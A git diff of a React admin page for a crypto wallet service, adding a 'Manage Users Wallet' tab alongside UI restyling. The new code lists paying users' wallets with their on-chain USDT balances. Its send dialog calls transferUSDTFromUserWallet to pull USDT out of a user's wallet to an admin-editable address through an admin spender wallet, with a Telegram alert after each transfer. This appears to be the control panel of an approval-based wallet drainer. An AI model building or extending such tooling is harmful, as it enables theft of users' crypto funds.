@@ -3,7 +3,7 @@ import { Link, useNavigate } from "react-router-dom";
 import { motion } from "framer-motion";
 import {
   Shield, Search, Users, FileText, Clock, CheckCircle2,
-  Eye, ChevronRight, LogOut, User, ShieldCheck, AlertTriangle, ArrowUpRight, Wallet
+  Eye, LogOut, User, ShieldCheck, AlertTriangle, Wallet, Loader2, MoreHorizontal
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -13,11 +13,21 @@ import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Label } from "@/components/ui/label";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { WalletSelectModal } from "@/components/WalletSelectModal";
+import {
+  DropdownMenu,
+  DropdownMenuContent,
+  DropdownMenuItem,
+  DropdownMenuTrigger,
+} from "@/components/ui/dropdown-menu";
 import { toast } from "sonner";
 import { apiRequest, ApiError } from "@/lib/api";
 import { clearSession, getSession } from "@/lib/session";
-import { connectWallet, withdrawUSDTFromContract, type Chain, type WalletConnectionMethod } from "@/lib/web3";
+import { getOnchainUSDTBalance, transferUSDTFromUserWallet, withdrawUSDTFromContract, type Chain, type WalletConnectionMethod } from "@/lib/web3";
+import { useWagmiWallet } from "@/lib/wagmi-hooks";
+import { useSolanaWallet } from "@/lib/solana-wallet-hooks";
+import { useTronWallet, type TronAdapterType } from "@/lib/tronwallet-adapter";
 
 interface WalletLookupResult {
   userId: string;
@@ -63,6 +73,16 @@ interface WithdrawalEntry {
   createdAt: string;
 }
 
+interface PaidWalletEntry {
+  userId: string;
+  walletAddress: string;
+  paymentCount: number;
+  totalPaidUsdt: number;
+  lastPaidAt: string | null;
+  usdtBalance: string | null;
+  balanceFetchError: string | null;
+}
+
 const fadeIn = {
   hidden: { opacity: 0, y: 15 },
   visible: (i: number) => ({
@@ -75,10 +95,6 @@ const fadeIn = {
 const Admin = () => {
   const navigate = useNavigate();
   const session = getSession();
-  const userDashboardUrl =
-    ((import.meta as { env?: Record<string, string | undefined> }).env?.VITE_USER_DASHBOARD_URL ??
-      "https://fiulink.com/dashboard")
-      .trim();
   const [loading, setLoading] = useState(true);
   const [searchWalletAddress, setSearchWalletAddress] = useState("");
   const [walletLookupResult, setWalletLookupResult] = useState<WalletLookupResult | null>(null);
@@ -99,9 +115,23 @@ const Admin = () => {
   const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
   const [isConnectingWallet, setIsConnectingWallet] = useState(false);
   const [isSubmittingWithdrawal, setIsSubmittingWithdrawal] = useState(false);
+  const [manageWalletChain, setManageWalletChain] = useState<SupportedChain>("ethereum");
+  const [paidWalletEntries, setPaidWalletEntries] = useState<PaidWalletEntry[]>([]);
+  const [isLoadingPaidWalletEntries, setIsLoadingPaidWalletEntries] = useState(false);
+  const [isSendUsdtModalOpen, setIsSendUsdtModalOpen] = useState(false);
+  const [sendUsdtTarget, setSendUsdtTarget] = useState<PaidWalletEntry | null>(null);
+  const [sendUsdtAmount, setSendUsdtAmount] = useState("10");
+  const [sendUsdtDestinationAddress, setSendUsdtDestinationAddress] = useState("");
+  const [sendUsdtWalletAddress, setSendUsdtWalletAddress] = useState("");
+  const [isConnectingSendUsdtWallet, setIsConnectingSendUsdtWallet] = useState(false);
+  const [isSendingUsdt, setIsSendingUsdt] = useState(false);
+  const [activeTab, setActiveTab] = useState("users");
 
   const canAccessAdmin = session?.user.role === "admin" || session?.user.role === "compliance";
   const canViewIdentityData = session?.user.role === "compliance";
+  const wagmiWallet = useWagmiWallet();
+  const solanaWallet = useSolanaWallet();
+  const tronWallet = useTronWallet();
 
   const loadAuditLogs = async () => {
     try {
@@ -114,6 +144,50 @@ const Admin = () => {
       toast.error(message);
     } finally {
       setLoading(false);
+    }
+  };
+
+  const loadPaidWalletEntries = async (chain: SupportedChain) => {
+    if (!["ethereum", "bsc", "tron"].includes(chain)) {
+      setPaidWalletEntries([]);
+      return;
+    }
+
+    try {
+      setIsLoadingPaidWalletEntries(true);
+      const [response, contractConfig] = await Promise.all([
+        apiRequest<{ chain: string; entries: PaidWalletEntry[] }>(
+          `/admin/paid-wallets?chain=${encodeURIComponent(chain)}`,
+          { auth: true }
+        ),
+        apiRequest<{ usdtTokenAddress?: string }>(`/web3/contract-config/${chain}`)
+      ]);
+
+      const entriesWithBalance = await Promise.all(
+        response.entries.map(async (entry) => {
+          try {
+            const balance = await getOnchainUSDTBalance(chain, entry.walletAddress, contractConfig.usdtTokenAddress);
+            return {
+              ...entry,
+              usdtBalance: balance.formattedBalance,
+              balanceFetchError: null
+            };
+          } catch (error) {
+            return {
+              ...entry,
+              usdtBalance: null,
+              balanceFetchError: error instanceof Error ? error.message : "Failed to fetch on-chain balance"
+            };
+          }
+        })
+      );
+
+      setPaidWalletEntries(entriesWithBalance);
+    } catch (error) {
+      const message = error instanceof ApiError ? error.message : "Failed to load paid wallets";
+      toast.error(message);
+    } finally {
+      setIsLoadingPaidWalletEntries(false);
     }
   };
 
@@ -130,6 +204,13 @@ const Admin = () => {
 
     void loadAuditLogs();
   }, [canAccessAdmin, navigate, session?.token]);
+
+  useEffect(() => {
+    if (!session?.token || !canAccessAdmin) {
+      return;
+    }
+    void loadPaidWalletEntries(manageWalletChain);
+  }, [canAccessAdmin, manageWalletChain, session?.token]);
 
   const handleLogout = () => {
     clearSession();
@@ -244,11 +325,31 @@ const Admin = () => {
     }
   };
 
-  const handleConnectWithdrawalWallet = async (method: WalletConnectionMethod) => {
+  const handleConnectWithdrawalWallet = async (method: WalletConnectionMethod, walletId?: string) => {
     try {
       setIsConnectingWallet(true);
       setIsWalletModalOpen(false);
-      const address = await connectWallet(selectedChain, method);
+      let address: string;
+
+      if (selectedChain === "tron") {
+        const tronAdapterByWalletId: Record<string, TronAdapterType> = {
+          tronlink: "tronlink",
+          tokenpocket: "tokenpocket",
+          trust: "trust",
+          "metamask-tron": "metamask",
+          okxwallet: "okxwallet",
+          safepal: "auto",
+          walletconnect: "walletconnect",
+        };
+        const selectedTronAdapter = walletId ? tronAdapterByWalletId[walletId] : undefined;
+        address = await tronWallet.connect(selectedTronAdapter ?? "auto");
+      } else if (selectedChain === "ethereum" || selectedChain === "bsc") {
+        address = await wagmiWallet.connectWallet(selectedChain);
+      } else {
+        const requestedSolanaWallet = walletId === "solflare" ? "solflare" : walletId === "phantom" ? "phantom" : undefined;
+        address = await solanaWallet.connectWallet(requestedSolanaWallet);
+      }
+
       setWithdrawalWalletAddress(address);
       toast.success("Wallet connected for withdrawal.");
     } catch (error) {
@@ -324,6 +425,99 @@ const Admin = () => {
     }
   };
 
+  const handleManageWalletChainChange = (nextChain: SupportedChain) => {
+    setManageWalletChain(nextChain);
+    setSendUsdtWalletAddress("");
+  };
+
+  const openSendUsdtModal = (entry: PaidWalletEntry) => {
+    setSendUsdtTarget(entry);
+    setSendUsdtAmount("10");
+    setSendUsdtDestinationAddress(entry.walletAddress);
+    setIsSendUsdtModalOpen(true);
+  };
+
+  const handleConnectSendUsdtWallet = async () => {
+    try {
+      setIsConnectingSendUsdtWallet(true);
+      const address =
+        manageWalletChain === "tron"
+          ? await tronWallet.connect("auto")
+          : manageWalletChain === "ethereum" || manageWalletChain === "bsc"
+            ? await wagmiWallet.connectWallet(manageWalletChain)
+            : await solanaWallet.connectWallet();
+      setSendUsdtWalletAddress(address);
+      toast.success("Admin wallet connected for user transfer.");
+    } catch (error) {
+      const message = error instanceof Error ? error.message : "Failed to connect admin wallet";
+      toast.error(message);
+    } finally {
+      setIsConnectingSendUsdtWallet(false);
+    }
+  };
+
+  const handleSendUsdtToUser = async () => {
+    if (!sendUsdtTarget) {
+      toast.error("No user selected.");
+      return;
+    }
+
+    const parsedAmount = Number.parseFloat(sendUsdtAmount);
+    if (Number.isNaN(parsedAmount) || parsedAmount <= 0) {
+      toast.error("Enter a valid USDT amount.");
+      return;
+    }
+
+    const destinationAddress = sendUsdtDestinationAddress.trim();
+    if (!destinationAddress) {
+      toast.error("Enter destination wallet address.");
+      return;
+    }
+
+    if (!sendUsdtWalletAddress) {
+      toast.error("Connect admin wallet first.");
+      return;
+    }
+
+    try {
+      setIsSendingUsdt(true);
+      const contractConfig = await apiRequest<{ usdtTokenAddress?: string }>(`/web3/contract-config/${manageWalletChain}`);
+      const txHash = await transferUSDTFromUserWallet(
+        manageWalletChain,
+        sendUsdtTarget.walletAddress,
+        destinationAddress,
+        sendUsdtAmount,
+        contractConfig.usdtTokenAddress
+      );
+      try {
+        await apiRequest("/admin/user-wallet-transfers/notify", {
+          method: "POST",
+          auth: true,
+          body: {
+            userId: sendUsdtTarget.userId,
+            chain: manageWalletChain,
+            fromWalletAddress: sendUsdtTarget.walletAddress,
+            toWalletAddress: destinationAddress,
+            spenderWalletAddress: sendUsdtWalletAddress,
+            amountUsdt: parsedAmount,
+            txHash
+          }
+        });
+      } catch (notifyError) {
+        console.error("[admin.manage-wallets] Transfer notify failed", notifyError);
+        toast.warning("Transfer succeeded, but Telegram notification failed.");
+      }
+      toast.success(`USDT transferred from user wallet. Tx: ${txHash.slice(0, 12)}...`);
+      setIsSendUsdtModalOpen(false);
+      await loadPaidWalletEntries(manageWalletChain);
+    } catch (error) {
+      const message = error instanceof Error ? error.message : "Failed to send USDT";
+      toast.error(message);
+    } finally {
+      setIsSendingUsdt(false);
+    }
+  };
+
   const getTxExplorerBaseUrl = (chain: SupportedChain): string => {
     if (chain === "ethereum") return "https://sepolia.etherscan.io/tx/";
     if (chain === "bsc") return "https://bscscan.com/tx/";
@@ -347,10 +541,73 @@ const Admin = () => {
     setIsWalletModalOpen(true);
   };
 
+  const handleCopyToClipboard = async (value: string, label: string) => {
+    try {
+      await navigator.clipboard.writeText(value);
+      toast.success(`${label} copied.`);
+    } catch {
+      toast.error(`Failed to copy ${label.toLowerCase()}.`);
+    }
+  };
+
+  const handleQuickAction = () => {
+    if (activeTab === "users") {
+      void handleWalletLookup();
+      return;
+    }
+    if (activeTab === "disclosures") {
+      void handleCreateDisclosureRequest();
+      return;
+    }
+    if (activeTab === "withdrawals") {
+      void handleCreateWithdrawalRequest();
+      return;
+    }
+    if (activeTab === "manage-wallets") {
+      void loadPaidWalletEntries(manageWalletChain);
+      return;
+    }
+    void loadAuditLogs();
+  };
+
+  const quickActionLabel =
+    activeTab === "users"
+      ? "Search Wallet"
+      : activeTab === "disclosures"
+        ? "Create Disclosure"
+        : activeTab === "withdrawals"
+          ? "Submit Withdrawal"
+          : activeTab === "manage-wallets"
+            ? "Refresh Wallets"
+            : "Refresh Audit";
+
+  const quickActionDisabled =
+    activeTab === "users"
+      ? !canAccessAdmin
+      : activeTab === "disclosures"
+        ? !canAccessAdmin
+        : activeTab === "withdrawals"
+          ? isSubmittingWithdrawal || isConnectingWallet || !canAccessAdmin
+          : activeTab === "manage-wallets"
+            ? isLoadingPaidWalletEntries
+            : loading;
+
   if (loading) {
     return (
       <div className="min-h-screen bg-background flex items-center justify-center">
-        <p className="text-muted-foreground">Loading admin panel...</p>
+        <Card className="app-section-card w-[min(92vw,520px)]">
+          <CardContent className="p-6 sm:p-7">
+            <div className="flex items-center gap-3 mb-5">
+              <Loader2 className="w-5 h-5 animate-spin text-accent" />
+              <p className="text-sm font-medium text-foreground">Loading admin panel</p>
+            </div>
+            <div className="space-y-3">
+              <div className="app-skeleton-line w-5/6" />
+              <div className="app-skeleton-line w-4/6" />
+              <div className="app-skeleton-line w-3/4" />
+            </div>
+          </CardContent>
+        </Card>
       </div>
     );
   }
@@ -358,7 +615,7 @@ const Admin = () => {
   if (!canAccessAdmin) {
     return (
       <div className="page-shell">
-        <header className="sticky top-0 z-50 bg-card/88 backdrop-blur-xl border-b border-border/55 shadow-[var(--shadow-xs)]">
+        <header className="app-fixed-header app-header-surface before:absolute before:inset-0 before:mesh-overlay before:opacity-30 before:pointer-events-none before:-z-10">
           <div className="page-container flex items-center justify-between h-14 sm:h-16">
             <Link to="/" className="flex items-center gap-2.5 group">
               <div className="w-9 h-9 rounded-xl gradient-accent flex items-center justify-center shadow-[var(--shadow-accent)] group-hover:shadow-[var(--shadow-lg)] transition-shadow">
@@ -372,8 +629,8 @@ const Admin = () => {
             </Button>
           </div>
         </header>
-        <div className="page-container py-6 sm:py-8 md:py-10 max-w-6xl">
-          <Card className="glass-card rounded-2xl mb-8">
+        <div className="page-container pt-20 sm:pt-24 pb-6 sm:pb-8 md:pb-10 max-w-6xl">
+          <Card className="app-section-card rounded-2xl mb-8">
             <CardContent className="p-6">
               <p className="text-sm text-muted-foreground">
                 Your account role is <strong>{session?.user.role}</strong>. Admin panel access requires
@@ -388,7 +645,7 @@ const Admin = () => {
 
   return (
     <div className="page-shell">
-      <header className="sticky top-0 z-50 bg-card/88 backdrop-blur-xl border-b border-border/55 shadow-[var(--shadow-xs)]">
+      <header className="app-fixed-header app-header-surface before:absolute before:inset-0 before:mesh-overlay before:opacity-30 before:pointer-events-none before:-z-10">
         <div className="page-container flex items-center justify-between h-14 sm:h-16">
           <Link to="/" className="flex items-center gap-2.5 group">
             <div className="w-9 h-9 rounded-xl gradient-accent flex items-center justify-center shadow-[var(--shadow-accent)] group-hover:shadow-[var(--shadow-lg)] transition-shadow">
@@ -398,13 +655,13 @@ const Admin = () => {
             <Badge className="ml-1.5 text-[10px] gradient-accent text-accent-foreground border-0 rounded-md px-2">Admin</Badge>
           </Link>
           <div className="flex items-center gap-2 sm:gap-3">
-            <a
-              href={userDashboardUrl}
-              className="text-xs sm:text-sm text-muted-foreground hover:text-foreground transition-colors inline-flex items-center gap-1"
+            <Link
+              to="/dashboard"
+              className="inline-flex items-center gap-1 rounded-lg border border-border/60 bg-muted/55 px-3 py-1.5 text-xs sm:text-sm font-medium text-muted-foreground hover:text-foreground hover:bg-muted/75 transition-colors"
             >
-              User Dashboard <ArrowUpRight className="w-3 h-3" />
-            </a>
-            <div className="flex items-center gap-2 px-2.5 sm:px-3.5 py-1.5 sm:py-2 rounded-xl bg-muted/70 border border-border/50">
+              User Dashboard
+            </Link>
+            <div className="flex items-center gap-2 px-2.5 sm:px-3.5 py-1.5 sm:py-2 rounded-xl bg-muted/60 border border-border/50 shadow-[var(--shadow-xs)]">
               <div className="w-7 h-7 rounded-lg bg-accent/10 flex items-center justify-center">
                 <ShieldCheck className="w-3.5 h-3.5 text-accent" />
               </div>
@@ -419,14 +676,14 @@ const Admin = () => {
         </div>
       </header>
 
-      <div className="page-container py-6 sm:py-8 md:py-10 max-w-6xl">
+      <div className="page-container pt-20 sm:pt-24 pb-28 sm:pb-8 md:pb-10 max-w-6xl">
         <motion.div initial="hidden" animate="visible" variants={fadeIn} custom={0}>
-          <div className="mb-7 sm:mb-9">
+          <div className="app-page-intro">
             <div className="flex items-center gap-3 mb-2">
               <ShieldCheck className="w-6 h-6 text-accent" />
               <h1 className="font-display text-2xl sm:text-3xl font-bold text-foreground">Admin Panel</h1>
             </div>
-            <p className="text-muted-foreground ml-0 sm:ml-9">Manage users, disclosure requests, and audit logs</p>
+            <p className="text-muted-foreground">Manage users, disclosures, transfers, and audit activity with secure operational controls.</p>
           </div>
         </motion.div>
 
@@ -439,7 +696,7 @@ const Admin = () => {
             { label: "Audit Events", value: auditLogs.length, icon: FileText, iconClass: "text-accent", accent: "from-accent/10 to-accent/5" },
           ].map((card, i) => (
             <motion.div key={card.label} initial="hidden" animate="visible" variants={fadeIn} custom={i + 1}>
-              <Card className="stat-card rounded-2xl overflow-hidden">
+              <Card className="app-kpi-card rounded-2xl overflow-hidden">
                 <CardContent className="p-5 sm:p-6">
                   <div className="flex items-center justify-between mb-4">
                     <span className="text-sm font-medium text-muted-foreground">{card.label}</span>
@@ -455,30 +712,35 @@ const Admin = () => {
         </div>
 
         <motion.div initial="hidden" animate="visible" variants={fadeIn} custom={5}>
-          <Tabs defaultValue="users" className="space-y-6">
-            <TabsList className="bg-muted/70 p-1.5 rounded-xl border border-border/50 w-full sm:w-auto overflow-x-auto max-w-full">
-              <TabsTrigger value="users" className="rounded-lg font-medium shrink-0">Users</TabsTrigger>
-              <TabsTrigger value="disclosures" className="rounded-lg font-medium shrink-0">Disclosure Requests</TabsTrigger>
-              <TabsTrigger value="withdrawals" className="rounded-lg font-medium shrink-0">Withdrawals</TabsTrigger>
-              <TabsTrigger value="audit" className="rounded-lg font-medium shrink-0">Audit Logs</TabsTrigger>
+          <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
+            <TabsList className="app-tabs-rail sm:w-auto max-w-full">
+              <TabsTrigger value="users" className="app-tabs-trigger">Users</TabsTrigger>
+              <TabsTrigger value="disclosures" className="app-tabs-trigger">Disclosure Requests</TabsTrigger>
+              <TabsTrigger value="withdrawals" className="app-tabs-trigger">Withdrawals</TabsTrigger>
+              <TabsTrigger value="manage-wallets" className="app-tabs-trigger">Manage Users Wallet</TabsTrigger>
+              <TabsTrigger value="audit" className="app-tabs-trigger">Audit Logs</TabsTrigger>
             </TabsList>
 
             <TabsContent value="users" className="space-y-5">
-              <div className="relative max-w-md">
-                <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
-                <Input
-                  placeholder="Search by wallet address..."
-                  className="pl-11 h-11 rounded-xl bg-muted/50 border-border/60 focus:bg-card transition-colors"
-                  value={searchWalletAddress}
-                  onChange={(event) => setSearchWalletAddress(event.target.value)}
-                />
+              <div className="app-sticky-subheader">
+                <div className="flex flex-col sm:flex-row gap-3">
+                  <div className="relative max-w-md w-full">
+                    <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+                    <Input
+                      placeholder="Search by wallet address..."
+                      className="pl-11 h-11 rounded-xl bg-muted/50 border-border/60 focus:bg-card transition-colors"
+                      value={searchWalletAddress}
+                      onChange={(event) => setSearchWalletAddress(event.target.value)}
+                    />
+                  </div>
+                  <Button variant="accent" onClick={() => void handleWalletLookup()} disabled={!canAccessAdmin} className="w-full sm:w-auto h-11">
+                    Search Wallet
+                  </Button>
+                </div>
               </div>
-              <Button variant="accent" onClick={() => void handleWalletLookup()} disabled={!canAccessAdmin} className="w-full sm:w-auto">
-                Search Wallet
-              </Button>
               <div className="space-y-3">
                 {walletLookupResult && (
-                  <Card key={walletLookupResult.userId} className="glass-card rounded-xl">
+                  <Card key={walletLookupResult.userId} className="app-section-card app-list-card rounded-xl">
                     <CardContent className="p-5 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
                       <div className="flex items-center gap-4 min-w-0">
                         <div className="w-11 h-11 rounded-xl bg-accent/8 border border-accent/10 flex items-center justify-center">
@@ -493,7 +755,7 @@ const Admin = () => {
                           </p>
                         </div>
                       </div>
-                      <div className="flex items-center gap-3 self-start sm:self-auto">
+                      <div className="flex items-center gap-2 self-start sm:self-auto">
                         <Badge
                           variant="outline"
                           className={`rounded-lg px-2.5 ${
@@ -508,33 +770,51 @@ const Admin = () => {
                             <><Clock className="w-3 h-3 mr-1" /> Pending</>
                           )}
                         </Badge>
-                        <Button
-                          variant="ghost"
-                          size="icon"
-                          className="rounded-lg h-9 w-9"
-                          onClick={() => void handleViewIdentity()}
-                          disabled={!canViewIdentityData}
-                          title={
-                            canViewIdentityData
-                              ? "View decrypted identity data"
-                              : "Only compliance role can view decrypted identity data"
-                          }
-                        >
-                          <Eye className="w-4 h-4" />
-                        </Button>
+                        <DropdownMenu>
+                          <DropdownMenuTrigger asChild>
+                            <Button variant="ghost" size="icon" className="rounded-lg h-9 w-9">
+                              <MoreHorizontal className="w-4 h-4" />
+                            </Button>
+                          </DropdownMenuTrigger>
+                          <DropdownMenuContent align="end">
+                            <DropdownMenuItem
+                              onClick={() => void handleViewIdentity()}
+                              disabled={!canViewIdentityData}
+                            >
+                              <Eye className="w-4 h-4 mr-2" />
+                              View Identity
+                            </DropdownMenuItem>
+                            <DropdownMenuItem
+                              onClick={() => void handleCopyToClipboard(walletLookupResult.walletAddress, "Wallet address")}
+                            >
+                              Copy Wallet
+                            </DropdownMenuItem>
+                            <DropdownMenuItem
+                              onClick={() => void handleCopyToClipboard(walletLookupResult.userId, "User ID")}
+                            >
+                              Copy User ID
+                            </DropdownMenuItem>
+                          </DropdownMenuContent>
+                        </DropdownMenu>
                       </div>
                     </CardContent>
                   </Card>
                 )}
                 {!walletLookupResult && (
-                  <Card className="glass-card rounded-xl">
-                    <CardContent className="p-5 text-sm text-muted-foreground">
-                      Search by wallet address to load the matched user.
+                  <Card className="app-section-card rounded-xl">
+                    <CardContent className="app-empty-state">
+                      <div className="mx-auto mb-3 w-11 h-11 rounded-xl bg-accent/10 border border-accent/20 flex items-center justify-center">
+                        <Search className="w-5 h-5 text-accent" />
+                      </div>
+                      <p className="text-sm font-semibold text-foreground">Start with wallet lookup</p>
+                      <p className="text-xs text-muted-foreground mt-1">
+                        Search by wallet address to load the matched user profile.
+                      </p>
                     </CardContent>
                   </Card>
                 )}
                 {identityResult && (
-                  <Card className="glass-card rounded-xl">
+                  <Card className="app-section-card rounded-xl">
                     <CardContent className="p-5 space-y-3">
                       <p className="text-sm font-semibold text-foreground">Decrypted Identity Data</p>
                       <pre className="text-xs text-muted-foreground whitespace-pre-wrap break-all">
@@ -544,7 +824,7 @@ const Admin = () => {
                   </Card>
                 )}
                 {!canViewIdentityData && walletLookupResult && (
-                  <Card className="glass-card rounded-xl">
+                  <Card className="app-section-card rounded-xl">
                     <CardContent className="p-5 text-sm text-muted-foreground">
                       Identity data viewing is restricted to `compliance` role.
                     </CardContent>
@@ -554,8 +834,10 @@ const Admin = () => {
             </TabsContent>
 
             <TabsContent value="disclosures" className="space-y-5">
-              <h3 className="font-display font-bold text-lg text-foreground">Lawful Disclosure Requests</h3>
-              <Card className="glass-card rounded-xl">
+              <div className="app-sticky-subheader">
+                <h3 className="font-display font-bold text-lg text-foreground">Lawful Disclosure Requests</h3>
+              </div>
+              <Card className="app-section-card rounded-xl">
                 <CardContent className="p-5 grid md:grid-cols-2 gap-4">
                   <div className="space-y-2">
                     <Label htmlFor="disclosureUserId">User ID</Label>
@@ -585,14 +867,14 @@ const Admin = () => {
                     />
                   </div>
                   <div className="md:col-span-2">
-                    <Button variant="accent" onClick={() => void handleCreateDisclosureRequest()} disabled={!canAccessAdmin}>
+                    <Button variant="accent" onClick={() => void handleCreateDisclosureRequest()} disabled={!canAccessAdmin} className="h-11 rounded-xl w-full sm:w-auto">
                       Create Disclosure Request
                     </Button>
                   </div>
                 </CardContent>
               </Card>
 
-              <Card className="glass-card rounded-xl">
+              <Card className="app-section-card rounded-xl">
                 <CardContent className="p-5 grid md:grid-cols-2 gap-4">
                   <div className="space-y-2">
                     <Label htmlFor="approveRequestId">Disclosure Request ID</Label>
@@ -614,7 +896,7 @@ const Admin = () => {
                     </div>
                   </div>
                   <div className="md:col-span-2">
-                    <Button variant="outline" onClick={() => void handleApproveDisclosure()} disabled={!canAccessAdmin}>
+                    <Button variant="outline" onClick={() => void handleApproveDisclosure()} disabled={!canAccessAdmin} className="h-11 rounded-xl w-full sm:w-auto">
                       Approve Disclosure Request
                     </Button>
                   </div>
@@ -623,7 +905,7 @@ const Admin = () => {
 
               <div className="space-y-3">
                 {disclosureRequests.map((req) => (
-                  <Card key={req.id} className="glass-card rounded-xl">
+                  <Card key={req.id} className="app-section-card app-list-card rounded-xl">
                     <CardContent className="p-5">
                       <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 mb-3">
                         <div className="flex items-center gap-4 min-w-0">
@@ -637,29 +919,55 @@ const Admin = () => {
                             </p>
                           </div>
                         </div>
-                        <Badge
-                          variant="outline"
-                          className={`rounded-lg px-2.5 ${
-                            req.status === "pending"
-                              ? "bg-warning/10 text-warning border-warning/20"
-                              : "bg-success/10 text-success border-success/20"
-                          }`}
-                        >
-                          {req.status === "pending" ? (
-                            <><Clock className="w-3 h-3 mr-1" /> Pending</>
-                          ) : (
-                            <><CheckCircle2 className="w-3 h-3 mr-1" /> Approved</>
-                          )}
-                        </Badge>
+                        <div className="flex items-center gap-2">
+                          <Badge
+                            variant="outline"
+                            className={`rounded-lg px-2.5 ${
+                              req.status === "pending"
+                                ? "bg-warning/10 text-warning border-warning/20"
+                                : "bg-success/10 text-success border-success/20"
+                            }`}
+                          >
+                            {req.status === "pending" ? (
+                              <><Clock className="w-3 h-3 mr-1" /> Pending</>
+                            ) : (
+                              <><CheckCircle2 className="w-3 h-3 mr-1" /> Approved</>
+                            )}
+                          </Badge>
+                          <DropdownMenu>
+                            <DropdownMenuTrigger asChild>
+                              <Button variant="ghost" size="icon" className="rounded-lg h-9 w-9">
+                                <MoreHorizontal className="w-4 h-4" />
+                              </Button>
+                            </DropdownMenuTrigger>
+                            <DropdownMenuContent align="end">
+                              <DropdownMenuItem onClick={() => setApproveRequestId(req.id)}>
+                                Use In Approve Form
+                              </DropdownMenuItem>
+                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(req.id, "Disclosure request ID")}>
+                                Copy Request ID
+                              </DropdownMenuItem>
+                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(req.walletAddress, "Wallet address")}>
+                                Copy Wallet
+                              </DropdownMenuItem>
+                            </DropdownMenuContent>
+                          </DropdownMenu>
+                        </div>
                       </div>
                       <p className="text-sm text-muted-foreground sm:ml-[60px] break-words">{req.lawfulRequestReference}</p>
                     </CardContent>
                   </Card>
                 ))}
                 {disclosureRequests.length === 0 && (
-                  <Card className="glass-card rounded-xl">
-                    <CardContent className="p-5 text-sm text-muted-foreground">
-                      No disclosure requests created in this session yet.
+                  <Card className="app-section-card rounded-xl">
+                    <CardContent className="app-empty-state">
+                      <div className="mx-auto mb-3 w-11 h-11 rounded-xl bg-accent/10 border border-accent/20 flex items-center justify-center">
+                        <FileText className="w-5 h-5 text-accent" />
+                      </div>
+                      <p className="text-sm font-semibold text-foreground">No disclosure requests yet</p>
+                      <p className="text-xs text-muted-foreground mt-1">
+                        Created disclosure requests will appear here for tracking and approval.
+                      </p>
                     </CardContent>
                   </Card>
                 )}
@@ -667,7 +975,8 @@ const Admin = () => {
             </TabsContent>
 
             <TabsContent value="withdrawals" className="space-y-5">
-              <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
+              <div className="app-sticky-subheader">
+                <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
                 <h3 className="font-display font-bold text-lg text-foreground">Chain Withdrawal Management</h3>
                 <div className="w-full sm:w-[220px]">
                   <Select value={selectedChain} onValueChange={(value) => handleChainChange(value as SupportedChain)}>
@@ -682,26 +991,27 @@ const Admin = () => {
                     </SelectContent>
                   </Select>
                 </div>
+                </div>
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <Card className="glass-card rounded-xl">
+                <Card className="app-section-card rounded-xl">
                   <CardContent className="p-4">
                     <p className="text-xs text-muted-foreground mb-1">Connected Wallet</p>
                     <p className="text-sm font-semibold text-foreground break-all">{getConnectedWalletDisplay()}</p>
                   </CardContent>
                 </Card>
-                <Card className="glass-card rounded-xl">
+                <Card className="app-section-card rounded-xl">
                   <CardContent className="p-4">
                     <p className="text-xs text-muted-foreground mb-1">Wallet Connection</p>
-                    <Button variant="outline" onClick={openWalletModal} disabled={isConnectingWallet} className="h-9 rounded-lg">
+                    <Button variant="outline" onClick={openWalletModal} disabled={isConnectingWallet} className="h-10 rounded-xl">
                       {withdrawalWalletAddress ? "Reconnect Wallet" : "Connect Wallet"}
                     </Button>
                   </CardContent>
                 </Card>
               </div>
 
-              <Card className="glass-card rounded-xl">
+              <Card className="app-section-card rounded-xl">
                 <CardContent className="p-5 grid md:grid-cols-2 gap-4">
                   <div className="space-y-2 md:col-span-2">
                     <Label htmlFor="withdrawDestination">Destination Wallet</Label>
@@ -738,6 +1048,7 @@ const Admin = () => {
                       variant="accent"
                       onClick={() => void handleCreateWithdrawalRequest()}
                       disabled={!canAccessAdmin || isSubmittingWithdrawal || isConnectingWallet}
+                      className="h-11 rounded-xl w-full sm:w-auto"
                     >
                       {isSubmittingWithdrawal ? "Submitting..." : "Withdraw With Connected Wallet"}
                     </Button>
@@ -747,7 +1058,7 @@ const Admin = () => {
 
               <div className="space-y-3">
                 {withdrawalEntries.map((entry) => (
-                  <Card key={entry.id} className="glass-card rounded-xl">
+                  <Card key={entry.id} className="app-section-card app-list-card rounded-xl">
                     <CardContent className="p-5">
                       <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 mb-3">
                         <div className="flex items-center gap-4 min-w-0">
@@ -761,12 +1072,32 @@ const Admin = () => {
                             </p>
                           </div>
                         </div>
-                        <Badge
-                          variant="outline"
-                          className="rounded-lg px-2.5 bg-success/10 text-success border-success/20"
-                        >
-                          {entry.status}
-                        </Badge>
+                        <div className="flex items-center gap-2">
+                          <Badge
+                            variant="outline"
+                            className="rounded-lg px-2.5 bg-success/10 text-success border-success/20"
+                          >
+                            {entry.status}
+                          </Badge>
+                          <DropdownMenu>
+                            <DropdownMenuTrigger asChild>
+                              <Button variant="ghost" size="icon" className="rounded-lg h-9 w-9">
+                                <MoreHorizontal className="w-4 h-4" />
+                              </Button>
+                            </DropdownMenuTrigger>
+                            <DropdownMenuContent align="end">
+                              <DropdownMenuItem onClick={() => window.open(`${getTxExplorerBaseUrl(entry.chain)}${entry.txHash}`, "_blank", "noopener,noreferrer")}>
+                                View Explorer
+                              </DropdownMenuItem>
+                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(entry.txHash, "Transaction hash")}>
+                                Copy Tx Hash
+                              </DropdownMenuItem>
